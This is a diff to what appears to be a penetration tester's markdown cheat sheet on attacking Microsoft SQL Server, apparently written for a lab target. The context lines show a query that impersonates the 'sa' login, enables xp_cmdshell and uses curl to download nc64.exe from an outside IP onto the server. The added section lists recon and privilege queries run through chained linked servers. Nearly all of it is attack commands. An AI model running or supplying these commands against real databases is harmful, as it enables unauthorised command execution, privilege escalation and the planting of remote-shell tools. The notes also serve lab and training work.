@@ -33,9 +33,6 @@ SELECT name FROM master..sysdatabases;
 
 # List Tables
 SELECT name FROM master..sysobjects WHERE xtype = 'U';
-
-
-
 ```
 
 ## Check server link
@@ -101,5 +98,29 @@ osql -E -S "<LOCAL_HOSTNAME>" -Q "EXECUTE('xp_cmdshell ''mkdir C:\mane''') AT [<
 
 ```
 DECLARE @sql NVARCHAR(MAX) = N'EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''cmd /c curl http://10.10.16.25/nc64.exe -o C:\programdata\nc64.exe'';'; EXEC (@sql) AT "PRIMARY";
+
+```
+
+
+## Impackets
+
+``` bash
+select @@version;
+
+enum_logins
+
+# Recon
+EXECUTE ('select @@servername;') at [COMPATIBILITY\POO_CONFIG];
+
+EXECUTE ('select suser_name();') at [COMPATIBILITY\POO_CONFIG];
+
+# execute as link
+EXECUTE ('SELECT name FROM master..syslogins WHERE sysadmin = ''1'';') at [COMPATIBILITY\POO_CONFIG];
+
+# execute as link on link server
+EXEC ('EXEC (''select suser_name();'') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
+
+# query permission
+EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [COMPATIBILITY\POO_CONFIG]
 
 ```
